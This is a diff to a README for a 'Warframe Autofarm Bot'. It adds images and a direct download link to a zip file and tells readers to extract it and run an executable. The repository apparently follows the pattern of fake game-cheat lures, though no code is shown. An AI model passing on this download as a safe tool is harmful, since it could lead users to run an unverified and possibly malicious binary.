@@ -1,4 +1,4 @@
-![WarFrame gold](https://github.com/user-attachments/assets/0b0e528e-79de-4fbc-8814-287192cb1177)
+![image](https://github.com/user-attachments/assets/face7d18-bc12-4316-ae15-9bdb153faef9)![WarFrame gold](https://github.com/user-attachments/assets/0b0e528e-79de-4fbc-8814-287192cb1177)
 
 # 🎮 Warframe Autofarm Bot
 
@@ -12,7 +12,8 @@ Welcome to the Warframe Autofarm Bot repository! This application is designed to
 
 ## 🚀 How to Use? Instruction
 
-1. Download the latest version of the Warframe Autofarm Bot.
+![image](https://github.com/user-attachments/assets/99059080-9c4b-4135-911a-28b856e5eca4)
+1. Download the latest version of the Warframe autofarm or [click](https://github.com/LeyvanDoyvski/Warframe-autofarm/releases/download/Release/warframe.autofarm.zip).
 2. Extract the contents.
 3. Open the file in extract folder `Warframe autofarm.exe`.
 4. Wait for the installation to complete.
